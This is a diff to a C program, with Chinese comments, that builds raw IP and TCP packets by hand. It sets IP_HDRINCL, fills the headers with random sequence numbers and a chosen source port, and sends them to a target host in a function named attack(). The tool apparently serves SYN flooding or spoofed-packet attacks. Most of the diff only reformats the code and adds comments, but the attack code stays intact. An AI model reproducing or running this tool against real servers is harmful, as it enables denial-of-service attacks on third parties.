@@ -1,3 +1,6 @@
+/*
+ *
+ */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -26,12 +29,14 @@ main(int argc, char *argv[])
 
 
 	if (argc != 4) {
-		fprintf(stderr, "Usage: %s dsthost dstport srcport\n", argv[0]);
-		return -1;
+		fprintf(stderr, "Usage: %s <dsthost> <dstport> <srcport>\n",
+			argv[0]);
+		exit(-1);
 	}
 
 
 	memset(&hints, 0, sizeof(struct addrinfo));
+
 	hints.ai_socktype = SOCK_RAW;
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_protocol = IPPROTO_TCP;	/* TCP的原始套接字 */
@@ -41,7 +46,7 @@ main(int argc, char *argv[])
 	ret = getaddrinfo(argv[1], argv[2], &hints, &result);
 	if (ret != 0) {
 		fprintf(stderr, "getaddrinfo() failed: %s\n", gai_strerror(ret));
-		return -1;
+		exit(-1);
 	}
 
 	optval = 1;
@@ -51,10 +56,12 @@ main(int argc, char *argv[])
 		if (fd == -1)
 			continue;
 
+		/* open IP_HDRINCL */
 		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
 			perror("setsockopt() failed: ");
-			return -1;
+			exit(-1);
 		}
+
 		break;
 	}
 
@@ -63,14 +70,19 @@ main(int argc, char *argv[])
 
 	svaddr = (struct sockaddr_in *) &addr;
 
-	/* root */
-	setuid(getpid()); // 让执行该命令的用户以该命令拥有者的权限去执行
+
+	/* 让执行该命令的用户以该命令拥有者的权限去执行 */
+	/* 因为只有root用户才可以play with raw socket :) */
+	setuid(getpid());
 	srcport = atoi(argv[3]);
 	attack(fd, svaddr, srcport);
 
 	return 0;
 }
 
+/*
+ * 在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
+ */
 void
 attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 {
@@ -86,6 +98,7 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 
 	/* 开始填充IP首部 */
 	ip_head = (struct ip *) buf;
+
 	ip_head->ip_v = IPVERSION;
 	ip_head->ip_hl = sizeof(struct ip) >> 2;
 	ip_head->ip_tos = 0;
@@ -95,10 +108,11 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 	ip_head->ip_ttl = MAXTTL;
 	ip_head->ip_p = IPPROTO_TCP;
 	ip_head->ip_sum = 0;
-	ip_head->ip_dst = svaddr->sin_addr;	// 服务器ip
+	ip_head->ip_dst = svaddr->sin_addr;
 
 	/* 开始填充TCP首部 */
 	tcp_head = (struct tcphdr *) (buf + sizeof(struct ip));
+
 	tcp_head->source = htons(srcport);
 	tcp_head->dest = svaddr->sin_port;
 	tcp_head->seq = random();
@@ -114,6 +128,9 @@ attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
 	}
 }
 
+/*
+ * CRC校验和的计算
+ */
 unsigned short
 check_sum(const unsigned char *ptr, int length)
 {
